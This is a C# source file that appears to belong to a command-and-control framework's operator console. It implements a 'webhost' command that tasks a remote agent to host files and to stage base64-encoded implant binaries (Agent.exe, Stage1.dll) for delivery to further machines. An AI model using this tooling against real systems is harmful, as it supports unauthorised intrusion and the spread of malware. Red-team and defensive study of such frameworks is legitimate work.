using Commander.Communication;
using Commander.Executor;
using Commander.Internal;
using Commander.Terminal;
using System;
using System.Collections.Generic;
using System.CommandLine;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Commander.Commands.Agent
{
    public class WebHostCommandOptions
    {
        public string verb { get; set; }
        public string bindto { get; set; }

        public string filename { get; set; }
    }

    public class WebHostCommand : EnhancedCommand<WebHostCommandOptions>
    {
        public override string Category => CommandCategory.Core;
        public override string Description => "Start a WebHost on the agent";
        public override string Name => "webhost";

        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(this.Description)
            {
                new Argument<string>("verb", "start | stop | show | push | rm | stage").FromAmong("start", "stop", "show", "push", "rm", "stage"),
                new Option<string>(new[] { "--bindto", "-b" }, () => null, "endpoint to bind to (http://address:port)"),
                new Option<string>(new[] { "--fileName", "-f" }, () => null, "file to push"),
            };

        protected async override Task<bool> HandleCommand(CommandContext<WebHostCommandOptions> context)
        {
            var agent = context.Executor.CurrentAgent;
            string commandArgs = null;

            if (context.Options.verb == "start")
            {
                if (string.IsNullOrEmpty(context.Options.bindto))
                {
                    context.Terminal.WriteError($"[X] BindTo is required!");
                    return false;
                }

                var url = context.Options.bindto;
                ConnexionUrl conn = ConnexionUrl.FromString(url);
                if (!conn.IsValid || conn.IsSecure || conn.Protocol != ConnexionType.Http)
                {
                    context.Terminal.WriteError($"[X] BindTo is not valid!");
                    return false;
                }

                commandArgs = $"{context.Options.verb} {context.Options.bindto}";
            }

            if (context.Options.verb == "stop" || context.Options.verb == "show")
            {
                commandArgs = $"{context.Options.verb}";
            }


            if (context.Options.verb == "push")
            {
                commandArgs = $"{context.Options.verb}";
                if(string.IsNullOrEmpty(context.Options.filename))
                {
                    context.Terminal.WriteError($"[X] File {context.Options.filename} not found");
                    return false;
                }

                if (!File.Exists(context.Options.filename))
                {
                    context.Terminal.WriteError($"[X] File {context.Options.filename} not found");
                    return false;
                }
                byte[] fileBytes = null;
                using (FileStream fs = File.OpenRead(context.Options.filename))
                {
                    fileBytes = new byte[fs.Length];
                    fs.Read(fileBytes, 0, (int)fs.Length);
                }

                string fileName = Path.GetFileName(context.Options.filename);
                bool first = true;
                var fileId = await context.CommModule.Upload(fileBytes, Path.GetFileName(fileName), a =>
                {
                    context.Terminal.ShowProgress("uploading", a, first);
                    first = false;
                });

                await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, this.Name, fileId, fileName, commandArgs);
                context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {context.Executor.CurrentAgent.Metadata.Id}.");
                return true;

            }

            if (context.Options.verb == "rm")
            {
                commandArgs = $"{context.Options.verb}";
                if (!string.IsNullOrEmpty(context.Options.filename))
                {
                    commandArgs += $" {context.Options.filename}";
                }
            }

            if (context.Options.verb == "stage")
            {
                await this.Stage(context);
                context.Terminal.WriteSuccess($"Stagers files tasked to  be host on the agent {context.Executor.CurrentAgent.Metadata.Id}.");
                return true;
            }

            context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, this.Name, commandArgs).Wait();
            context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {context.Executor.CurrentAgent.Metadata.Id}.");


            return true;
        }

        private async Task Stage(CommandContext<WebHostCommandOptions> context)
        {
            var files = new List<string> { "Agent.exe", "Agent-x86.exe", "Stage1.dll", "Stage1-x86.dll" };
            foreach(var f in files)
            {
                var fileBytes = GenerateB64(f);
                var fileName = Path.GetFileNameWithoutExtension(f) + ".b64";
                bool first = true;
                var fileId = await context.CommModule.Upload(fileBytes, fileName, a =>
                {
                    context.Terminal.ShowProgress("uploading", a, first);
                    first = false;
                });
                await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, this.Name, fileId, fileName, "push");
                //context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {context.Executor.CurrentAgent.Metadata.Id}.");
            }

            
        }

        public byte[] GenerateB64(string sourceFile)
        {
            var inputFile = Path.Combine(BuildHelper.SourceFolder, sourceFile);
            byte[] bytes = File.ReadAllBytes(inputFile);
            string base64 = Convert.ToBase64String(bytes);
            return Encoding.UTF8.GetBytes(base64);
        }

        public static async Task PushFile(CommandContext context, string fileName, byte[] fileBytes)
        {
            bool first = true;
            var fileId = await context.CommModule.Upload(fileBytes, fileName, a =>
            {
                context.Terminal.ShowProgress("uploading", a, first);
                first = false;
            });
            await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, "webhost", fileId, fileName, "push");
        }
    }


}
